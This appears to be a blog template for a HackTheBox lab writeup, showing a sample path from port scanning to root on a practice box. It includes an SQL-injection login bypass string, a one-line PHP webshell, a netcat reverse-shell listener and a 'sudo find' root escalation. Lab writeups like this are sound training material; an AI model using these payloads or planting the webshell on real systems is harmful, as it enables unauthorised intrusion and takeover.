---
layout: post
title: "Example — HTB Machine Writeup"
category: writeups
date: 2026-07-11 20:00:00 +0000
difficulty: Easy          # Easy | Medium | Hard | Insane
os: Linux                 # Linux | Windows
platform: HackTheBox
points: 20
status: Owned             # Owned | In progress
tags: [nmap, web, sqli, privesc, sudo]
description: "A template writeup — enumeration to root. Copy this file, rename it, and swap in your own box."
---

> **This is a template.** Duplicate this file, rename it to
> `YYYY-MM-DD-<machine>.md`, edit the front matter above, and write your own.
> Delete this note when you're done.

## Overview

A quick paragraph: what the box is, its difficulty, and the attack path in one
line. *Foothold via SQL injection → credentials in config → root via a misconfigured
sudo entry.*

<!--more-->

## Enumeration

Start with a full port scan:

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full 10.10.11.10
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

Two ports. SSH is rarely the way in on an easy box, so focus on port **80**.

### Web enumeration

```bash
ffuf -u http://10.10.11.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raccoon.txt -mc 200,301,302
```

The `/admin` login form looks promising.

## Foothold

The login is vulnerable to a classic authentication bypass:

```sql
' OR 1=1 -- -
```

That drops us into the dashboard, where a file-upload feature accepts PHP. Upload
a webshell and catch a reverse shell:

```bash
nc -lvnp 4444
```

```php
<?php system($_GET['cmd']); ?>
```

## Privilege Escalation

Check sudo rights:

```bash
sudo -l
```

```
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/find
```

`find` can execute commands as root via GTFOBins:

```bash
sudo find . -exec /bin/sh \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted. 🩸

## Lessons learned

- Always try SQLi auth bypass on custom login forms before brute-forcing.
- `sudo -l` is the first thing to run on any foothold.
- Check [GTFOBins](https://gtfobins.github.io/) for any binary you can run as root.

## Loot

| Flag | Location |
|------|----------|
| user | `/home/user/user.txt` |
| root | `/root/root.txt`     |
